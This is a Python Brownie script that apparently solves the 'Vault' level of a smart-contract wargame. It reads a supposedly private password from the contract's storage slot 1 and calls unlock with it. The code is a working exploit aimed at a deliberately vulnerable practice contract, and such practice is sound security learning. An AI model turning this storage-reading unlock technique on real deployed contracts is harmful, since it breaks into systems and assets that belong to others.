from brownie import Vault, web3

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "08_vault"
INTERFACE_CONTRACT = Vault


def solve_level(level_contract):
    account = get_account()
    # DeprecationWarning: getStorageAt is deprecated in favor of get_storage_at
    # password = web3.eth.getStorageAt(level_contract.address, 1)
    password = web3.eth.get_storage_at(level_contract.address, 1)
    # print(web3.toText(password))
    tx = level_contract.unlock(password, {"from": account})
    tx.wait(1)


# brownie run scripts/_08_vault.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
